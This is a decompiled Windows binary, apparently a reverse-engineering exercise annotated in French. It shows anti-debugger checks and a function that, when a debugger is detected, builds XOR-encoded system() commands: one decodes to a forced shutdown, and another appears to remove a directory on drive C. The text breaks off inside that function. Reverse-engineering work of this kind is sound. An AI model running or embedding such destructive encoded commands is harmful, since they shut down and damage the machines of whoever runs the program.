typedef unsigned char undefined;

typedef unsigned int pointer32; // Pas sûr de ce rajout, à voir

typedef unsigned long long GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char bool;
typedef unsigned char byte;
typedef unsigned int dword;
typedef long long longlong;
typedef unsigned char uchar;
typedef unsigned int uint;
typedef unsigned long ulong;
typedef unsigned long long ulonglong;
typedef unsigned char undefined1;
typedef unsigned short undefined2;
typedef unsigned int undefined4;
typedef unsigned long long undefined8;
typedef unsigned short ushort;
typedef unsigned short wchar16;
typedef short wchar_t;
typedef unsigned short word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor
{
  void *pVFTable;
  void *spare;
  char name[0];
};

struct _s_HandlerType
{
  uint adjectives;
  struct TypeDescriptor *pType;
  ptrdiff_t dispCatchObj;
  void *addressOfHandler;
};

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD
{
  ptrdiff_t mdisp;
  ptrdiff_t pdisp;
  ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor
{
  struct TypeDescriptor *pTypeDescriptor;                  // ref to TypeDescriptor (RTTI 0) for class
  dword numContainedBases;                                 // count of extended classes in BaseClassArray (RTTI 2)
  struct PMD where;                                        // member displacement structure
  dword attributes;                                        // bit flags
  RTTIClassHierarchyDescriptor *pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor
{
  dword signature;
  dword attributes;                          // bit flags
  dword numBaseClasses;                      // number of base classes (i.e. rtti1Count)
  RTTIBaseClassDescriptor **pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry
{
  __ehstate_t toState;
  void (*action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct
{
  dword OffsetToDirectory;
  dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion
{
  dword OffsetToData;
  struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry
{
  __ehstate_t tryLow;
  __ehstate_t tryHigh;
  __ehstate_t catchHigh;
  int nCatches;
  HandlerType *pHandlerArray;
};

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator
{
  dword signature;
  dword offset;                                   // offset of vbtable within class
  dword cdOffset;                                 // constructor displacement offset
  struct TypeDescriptor *pTypeDescriptor;         // ref to TypeDescriptor (RTTI 0) for class
  RTTIClassHierarchyDescriptor *pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

struct _s_ESTypeList
{
  int nCount;
  HandlerType *pTypeArray;
};

typedef struct _s_ESTypeList ESTypeList;

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID
{
  void *UniqueProcess;
  void *UniqueThread;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

struct _s_FuncInfo
{
  uint magicNumber_and_bbtFlags;
  __ehstate_t maxState;
  UnwindMapEntry *pUnwindMap;
  uint nTryBlocks;
  TryBlockMapEntry *pTryBlockMap;
  uint nIPMapEntries;
  void *pIPToStateMap;
  ESTypeList *pESTypeList;
  int EHFlags;
};

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef struct tagWNDCLASSW tagWNDCLASSW, *PtagWNDCLASSW;

typedef uint UINT;

typedef long LONG_PTR;

typedef LONG_PTR LRESULT;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef LONG_PTR LPARAM;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__
{
  int unused;
};

struct HICON__
{
  int unused;
};

struct tagWNDCLASSW
{
  UINT style;
  WNDPROC lpfnWndProc;
  int cbClsExtra;
  int cbWndExtra;
  HINSTANCE hInstance;
  HICON hIcon;
  HCURSOR hCursor;
  HBRUSH hbrBackground;
  LPCWSTR lpszMenuName;
  LPCWSTR lpszClassName;
};

struct HINSTANCE__
{
  int unused;
};

struct HWND__
{
  int unused;
};

typedef struct tagWNDCLASSW WNDCLASSW;

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

typedef void *HANDLE;

typedef ulong DWORD;

struct _PROCESS_INFORMATION
{
  HANDLE hProcess;
  HANDLE hThread;
  DWORD dwProcessId;
  DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES
{
  DWORD nLength;
  LPVOID lpSecurityDescriptor;
  BOOL bInheritHandle;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

struct _STARTUPINFOW
{
  DWORD cb;
  LPWSTR lpReserved;
  LPWSTR lpDesktop;
  LPWSTR lpTitle;
  DWORD dwX;
  DWORD dwY;
  DWORD dwXSize;
  DWORD dwYSize;
  DWORD dwXCountChars;
  DWORD dwYCountChars;
  DWORD dwFillAttribute;
  DWORD dwFlags;
  WORD wShowWindow;
  WORD cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef long LONG;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef void *PVOID;

typedef ulong ULONG_PTR;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA
{
  DWORD ControlWord;
  DWORD StatusWord;
  DWORD TagWord;
  DWORD ErrorOffset;
  DWORD ErrorSelector;
  DWORD DataOffset;
  DWORD DataSelector;
  BYTE RegisterArea[80];
  DWORD Cr0NpxState;
};

struct _CONTEXT
{
  DWORD ContextFlags;
  DWORD Dr0;
  DWORD Dr1;
  DWORD Dr2;
  DWORD Dr3;
  DWORD Dr6;
  DWORD Dr7;
  FLOATING_SAVE_AREA FloatSave;
  DWORD SegGs;
  DWORD SegFs;
  DWORD SegEs;
  DWORD SegDs;
  DWORD Edi;
  DWORD Esi;
  DWORD Ebx;
  DWORD Edx;
  DWORD Ecx;
  DWORD Eax;
  DWORD Ebp;
  DWORD Eip;
  DWORD SegCs;
  DWORD EFlags;
  DWORD Esp;
  DWORD SegSs;
  BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD
{
  DWORD ExceptionCode;
  DWORD ExceptionFlags;
  struct _EXCEPTION_RECORD *ExceptionRecord;
  PVOID ExceptionAddress;
  DWORD NumberParameters;
  ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS
{
  PEXCEPTION_RECORD ExceptionRecord;
  PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef enum _HEAP_INFORMATION_CLASS
{
  HeapCompatibilityInformation = 0,
  HeapEnableTerminationOnCorruption = 1
} _HEAP_INFORMATION_CLASS;

typedef char CHAR;

typedef CHAR *LPCSTR;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _LUID
{
  DWORD LowPart;
  LONG HighPart;
};

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

struct _LUID_AND_ATTRIBUTES
{
  LUID Luid;
  DWORD Attributes;
};

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20
{
  DWORD LowPart;
  LONG HighPart;
};

struct _struct_19
{
  DWORD LowPart;
  LONG HighPart;
};

union _LARGE_INTEGER
{
  struct _struct_19 s;
  struct _struct_20 u;
  LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226
{
  DWORD PhysicalAddress;
  DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER
{
  BYTE Name[8];
  union _union_226 Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD NumberOfRelocations;
  WORD NumberOfLinenumbers;
  DWORD Characteristics;
};

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

struct _TOKEN_PRIVILEGES
{
  DWORD PrivilegeCount;
  LUID_AND_ATTRIBUTES Privileges[1];
};

typedef CHAR *LPSTR;

typedef enum _HEAP_INFORMATION_CLASS HEAP_INFORMATION_CLASS;

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef struct _TOKEN_PRIVILEGES *PTOKEN_PRIVILEGES;

typedef struct _LUID *PLUID;

typedef HANDLE *PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER
{
  char e_magic[2];     // Magic number
  word e_cblp;         // Bytes of last page
  word e_cp;           // Pages in file
  word e_crlc;         // Relocations
  word e_cparhdr;      // Size of header in paragraphs
  word e_minalloc;     // Minimum extra paragraphs needed
  word e_maxalloc;     // Maximum extra paragraphs needed
  word e_ss;           // Initial (relative) SS value
  word e_sp;           // Initial SP value
  word e_csum;         // Checksum
  word e_ip;           // Initial IP value
  word e_cs;           // Initial (relative) CS value
  word e_lfarlc;       // File address of relocation table
  word e_ovno;         // Overlay number
  word e_res[4][4];    // Reserved words
  word e_oemid;        // OEM identifier (for e_oeminfo)
  word e_oeminfo;      // OEM information; e_oemid specific
  word e_res2[10][10]; // Reserved words
  dword e_lfanew;      // File address of new exe header
  byte e_program[64];  // Actual DOS program
};

typedef ULONG_PTR SIZE_T;

typedef ULONG_PTR DWORD_PTR;

typedef struct DotNetPdbInfo DotNetPdbInfo, *PDotNetPdbInfo;

struct DotNetPdbInfo
{
  char signature[4];
  GUID guid;
  dword age;
  char pdbpath[65];
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME
{
  DWORD dwLowDateTime;
  DWORD dwHighDateTime;
};

typedef int (*FARPROC)(void);

typedef DWORD *LPDWORD;

typedef WORD ATOM;

typedef struct HMENU__ HMENU__, *PHMENU__;

struct HMENU__
{
  int unused;
};

typedef DWORD *PDWORD;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef HINSTANCE HMODULE;

typedef BOOL *PBOOL;

typedef struct HMENU__ *HMENU;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY
{
  ImageBaseOffset32 VirtualAddress;
  dword Size;
};

struct IMAGE_OPTIONAL_HEADER32
{
  word Magic;
  byte MajorLinkerVersion;
  byte MinorLinkerVersion;
  dword SizeOfCode;
  dword SizeOfInitializedData;
  dword SizeOfUninitializedData;
  ImageBaseOffset32 AddressOfEntryPoint;
  ImageBaseOffset32 BaseOfCode;
  ImageBaseOffset32 BaseOfData;
  pointer32 ImageBase;
  dword SectionAlignment;
  dword FileAlignment;
  word MajorOperatingSystemVersion;
  word MinorOperatingSystemVersion;
  word MajorImageVersion;
  word MinorImageVersion;
  word MajorSubsystemVersion;
  word MinorSubsystemVersion;
  dword Win32VersionValue;
  dword SizeOfImage;
  dword SizeOfHeaders;
  dword CheckSum;
  word Subsystem;
  word DllCharacteristics;
  dword SizeOfStackReserve;
  dword SizeOfStackCommit;
  dword SizeOfHeapReserve;
  dword SizeOfHeapCommit;
  dword LoaderFlags;
  dword NumberOfRvaAndSizes;
  struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct
{
  dword NameOffset;
  dword NameIsString;
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY
{
  dword Characteristics;
  dword TimeDateStamp;
  word MajorVersion;
  word MinorVersion;
  dword Type;
  dword SizeOfData;
  dword AddressOfRawData;
  dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER
{
  word Machine; // 332
  word NumberOfSections;
  dword TimeDateStamp;
  dword PointerToSymbolTable;
  dword NumberOfSymbols;
  word SizeOfOptionalHeader;
  word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32
{
  char Signature[4];
  struct IMAGE_FILE_HEADER FileHeader;
  struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion
{
  struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
  dword Name;
  word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY
{
  union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
  union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags
{
  IMAGE_SCN_TYPE_NO_PAD = 8,
  IMAGE_SCN_RESERVED_0001 = 16,
  IMAGE_SCN_CNT_CODE = 32,
  IMAGE_SCN_CNT_INITIALIZED_DATA = 64,
  IMAGE_SCN_CNT_UNINITIALIZED_DATA = 128,
  IMAGE_SCN_LNK_OTHER = 256,
  IMAGE_SCN_LNK_INFO = 512,
  IMAGE_SCN_RESERVED_0040 = 1024,
  IMAGE_SCN_LNK_REMOVE = 2048,
  IMAGE_SCN_LNK_COMDAT = 4096,
  IMAGE_SCN_GPREL = 32768,
  IMAGE_SCN_MEM_16BIT = 131072,
  IMAGE_SCN_MEM_PURGEABLE = 131072,
  IMAGE_SCN_MEM_LOCKED = 262144,
  IMAGE_SCN_MEM_PRELOAD = 524288,
  IMAGE_SCN_ALIGN_1BYTES = 1048576,
  IMAGE_SCN_ALIGN_2BYTES = 2097152,
  IMAGE_SCN_ALIGN_4BYTES = 3145728,
  IMAGE_SCN_ALIGN_8BYTES = 4194304,
  IMAGE_SCN_ALIGN_16BYTES = 5242880,
  IMAGE_SCN_ALIGN_32BYTES = 6291456,
  IMAGE_SCN_ALIGN_64BYTES = 7340032,
  IMAGE_SCN_ALIGN_128BYTES = 8388608,
  IMAGE_SCN_ALIGN_256BYTES = 9437184,
  IMAGE_SCN_ALIGN_512BYTES = 10485760,
  IMAGE_SCN_ALIGN_1024BYTES = 11534336,
  IMAGE_SCN_ALIGN_2048BYTES = 12582912,
  IMAGE_SCN_ALIGN_4096BYTES = 13631488,
  IMAGE_SCN_ALIGN_8192BYTES = 14680064,
  IMAGE_SCN_LNK_NRELOC_OVFL = 16777216,
  IMAGE_SCN_MEM_DISCARDABLE = 33554432,
  IMAGE_SCN_MEM_NOT_CACHED = 67108864,
  IMAGE_SCN_MEM_NOT_PAGED = 134217728,
  IMAGE_SCN_MEM_SHARED = 268435456,
  IMAGE_SCN_MEM_EXECUTE = 536870912,
  IMAGE_SCN_MEM_READ = 1073741824,
  IMAGE_SCN_MEM_WRITE = 2147483648
} SectionFlags;

union Misc
{
  dword PhysicalAddress;
  dword VirtualSize;
};

struct IMAGE_SECTION_HEADER
{
  char Name[8];
  union Misc Misc;
  ImageBaseOffset32 VirtualAddress;
  dword SizeOfRawData;
  dword PointerToRawData;
  dword PointerToRelocations;
  dword PointerToLinenumbers;
  word NumberOfRelocations;
  word NumberOfLinenumbers;
  enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY
{
  dword OffsetToData;
  dword Size;
  dword CodePage;
  dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY
{
  dword Characteristics;
  dword TimeDateStamp;
  word MajorVersion;
  word MinorVersion;
  word NumberOfNamedEntries;
  word NumberOfIdEntries;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32
{
  dword Size;
  dword TimeDateStamp;
  word MajorVersion;
  word MinorVersion;
  dword GlobalFlagsClear;
  dword GlobalFlagsSet;
  dword CriticalSectionDefaultTimeout;
  dword DeCommitFreeBlockThreshold;
  dword DeCommitTotalFreeThreshold;
  pointer32 LockPrefixTable;
  dword MaximumAllocationSize;
  dword VirtualMemoryThreshold;
  dword ProcessHeapFlags;
  dword ProcessAffinityMask;
  word CsdVersion;
  word DependentLoadFlags;
  pointer32 EditList;
  pointer32 SecurityCookie;
  pointer32 SEHandlerTable;
  dword SEHandlerCount;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf
{
  char *_ptr;
  int _cnt;
  char *_base;
  int _flag;
  int _file;
  int _charbuf;
  int _bufsiz;
  char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef BOOL (*PHANDLER_ROUTINE)(DWORD);

typedef void (*PMFN)(void *);

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

// WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor

struct _s_CatchableType
{
  uint properties;
  struct TypeDescriptor *pType;
  struct PMD thisDisplacement;
  int sizeOrOffset;
  PMFN copyFunction;
};

typedef struct _s_CatchableType CatchableType;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

struct _s_CatchableTypeArray
{
  int nCatchableTypes;
  CatchableType *arrayOfCatchableTypes[0];
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo
{
  uint attributes;
  PMFN pmfnUnwind;
  int (*pForwardCompat)(void);
  CatchableTypeArray *pCatchableTypeArray;
};

typedef struct HWAVEOUT__ HWAVEOUT__, *PHWAVEOUT__;

struct HWAVEOUT__
{
  int unused;
};

typedef struct tWAVEFORMATEX tWAVEFORMATEX, *PtWAVEFORMATEX;

typedef struct tWAVEFORMATEX WAVEFORMATEX;

typedef WAVEFORMATEX *LPCWAVEFORMATEX;

struct tWAVEFORMATEX
{
  WORD wFormatTag;
  WORD nChannels;
  DWORD nSamplesPerSec;
  DWORD nAvgBytesPerSec;
  WORD nBlockAlign;
  WORD wBitsPerSample;
  WORD cbSize;
};

typedef UINT MMRESULT;

typedef struct HWAVEOUT__ *HWAVEOUT;

typedef HWAVEOUT *LPHWAVEOUT;

typedef uint uintptr_t;

typedef struct type_info type_info, *Ptype_info;

struct type_info
{ // PlaceHolder Structure
};

typedef struct exception exception, *Pexception;

struct exception
{ // PlaceHolder Structure
};

/*
typedef struct basic_ios<wchar_t, struct_std::char_traits<wchar_t> _> basic_ios<wchar_t, struct_std::char_traits<wchar_t> _>, *Pbasic_ios<wchar_t, struct_std::char_traits<wchar_t> _>;

struct basic_ios<wchar_t, struct_std::char_traits<wchar_t> _>
{ // PlaceHolder Structure
};

typedef struct basic_ostream<wchar_t, struct_std::char_traits<wchar_t> _> basic_ostream<wchar_t, struct_std::char_traits<wchar_t> _>, *Pbasic_ostream<wchar_t, struct_std::char_traits<wchar_t> _>;

struct basic_ostream<wchar_t, struct_std::char_traits<wchar_t> _>
{ // PlaceHolder Structure
};

typedef struct basic_iostream<wchar_t, struct_std::char_traits<wchar_t> _> basic_iostream<wchar_t, struct_std::char_traits<wchar_t> _>, *Pbasic_iostream<wchar_t, struct_std::char_traits<wchar_t> _>;

struct basic_iostream<wchar_t, struct_std::char_traits<wchar_t> _>
{ // PlaceHolder Structure
};

typedef struct basic_streambuf<wchar_t, struct_std::char_traits<wchar_t> _> basic_streambuf<wchar_t, struct_std::char_traits<wchar_t> _>, *Pbasic_streambuf<wchar_t, struct_std::char_traits<wchar_t> _>;

struct basic_streambuf<wchar_t, struct_std::char_traits<wchar_t> _>
{ // PlaceHolder Structure
};
*/

typedef struct locale locale, *Plocale;

struct locale
{ // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef int errno_t;

typedef size_t rsize_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo
{
  int newmode;
};

unsigned int *__thiscall FUN_00401010(void *this, byte param_1)

{
  *(unsigned char ***)this = std::bad_alloc::vftable;
  std::exception::~exception((exception *)this);
  if ((param_1 & 1) != 0)
  {
    operator_delete(this);
  }
  return (unsigned int *)this;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_00401040(void)

{
  char cVar1;
  char *pcVar2;
  BOOL BVar3;
  HANDLE hProcess;
  uint uVar4;
  uint uVar5;
  char *unaff_EDI;
  int *pbDebuggerPresent;
  int local_8;

  pcVar2 = unaff_EDI;
  do
  {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  if (0x20 < (uint)((int)pcVar2 - (int)(unaff_EDI + 1)))
  {
    return (int)pcVar2 - (int)(unaff_EDI + 1) & 0xffffff00;
  }
  _DAT_004065dc = _DAT_004065dc + 0x19;
  BVar3 = IsDebuggerPresent();
  if (BVar3 == 0)
  {
    pbDebuggerPresent = &local_8;
    hProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(hProcess, pbDebuggerPresent);
    if (local_8 == 0)
    {
      uVar5 = 0;
      pcVar2 = unaff_EDI;
      do
      {
        cVar1 = *pcVar2;
        pcVar2 = pcVar2 + 1;
      } while (cVar1 != '\0');
      uVar4 = (int)pcVar2 - (int)(unaff_EDI + 1);
      if (uVar4 != 0)
      {
        do
        {
          cVar1 = unaff_EDI[uVar5];
          if ((((cVar1 < 'a') || ('f' < cVar1)) && ((cVar1 < 'A' || ('F' < cVar1)))) &&
              (9 < (byte)(cVar1 - 0x30U)))
          {
            return uVar4 & 0xffffff00;
          }
          uVar5 = uVar5 + 1;
          pcVar2 = unaff_EDI;
          do
          {
            cVar1 = *pcVar2;
            pcVar2 = pcVar2 + 1;
          } while (cVar1 != '\0');
          uVar4 = (int)pcVar2 - (int)(unaff_EDI + 1);
        } while (uVar5 < uVar4);
      }
      return CONCAT31((int3)(uVar4 >> 8), 1);
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

bool FUN_004010f0(void)

{
  uint uVar1;
  BOOL BVar2;
  HANDLE hProcess;
  FILE *_File;
  bool bVar3;
  int *pbDebuggerPresent;
  int local_8;

  uVar1 = FUN_00401040();
  bVar3 = (char)uVar1 != '\0';
  BVar2 = IsDebuggerPresent();
  if (BVar2 == 0)
  {
    pbDebuggerPresent = &local_8;
    hProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(hProcess, pbDebuggerPresent);
    if (local_8 == 0)
    {
      if (bVar3)
      {
        printf("%s\n");
      }
      _File = __iob_func();
      fflush(_File);
      return bVar3;
    }
  }
  mechant_system_call();
  // WARNING: Subroutine does not return
  exit(1);
}

/*
Fait des appels système avec des variables calculées. J'investigue actuellement pour trouver les appels système en question
Oh les fous !
Après analyse, system() fait un appel à `/end`. Je ne sais pas à quoi ça correspond sous Windows. Soit ça existe déjà, soit c'est un fichier qu'ils créent ailleurs et qu'ils exécutent ici.

OK OK OK OK ! Cette fonction est appelée à chaque fois qu'on essaye de débugger. Ce qui signifie que c'est une fonction méchante !!
*/
void mechant_system_call(void)

{
  char cVar1;
  unsigned int *puVar2;
  unsigned int local_68;
  unsigned int local_64;
  unsigned int local_60;
  unsigned int local_5c;
  unsigned int local_58;
  unsigned int local_54;
  unsigned int local_50;
  unsigned int local_4c;
  unsigned int local_48;
  unsigned int local_44;
  unsigned int local_40;
  unsigned int local_3c;
  unsigned char local_38;
  unsigned int local_34;
  unsigned int local_30;
  unsigned int local_2c;
  unsigned int local_28;
  unsigned int local_24;
  unsigned int local_20;
  unsigned int local_1c;
  unsigned int local_18;
  unsigned int local_14;
  unsigned int local_10;
  unsigned short local_c;
  unsigned int local_8;

  local_8 = DAT_00406018 ^ (unsigned int)&stack0xfffffffc;
  local_34 = 0x8ec4cdc3;
  local_30 = 0x80c5d8c5;
  local_2c = 0x8280c38f;
  local_28 = 0xd2c1d4d3;
  local_24 = 0xc28f80d4;
  local_20 = 0xd5c8d380;
  local_1c = 0xd7cfc4d4;
  local_18 = 0xd38d80ce;
  local_14 = 0x80c68d80;
  local_10 = 0x9380d48d;
  local_c = 0x82;
  local_68 = 0x8ec4cdc3;
  local_64 = 0x80c5d8c5;
  local_60 = 0x8280c38f;
  local_5c = 0xc380c4d2;
  local_58 = 0xa9b7bc9a;
  local_54 = 0xb7afa4ae;
  local_50 = 0xd9d3bcb3;
  local_4c = 0xcdc5d4d3;
  local_48 = 0x8f809293;
  local_44 = 0xb18f80b3;
  local_40 = 0x809e9280;
  local_3c = 0x82ccd5ce;
  local_38 = 0;
  puVar2 = &local_34;
  do
  {
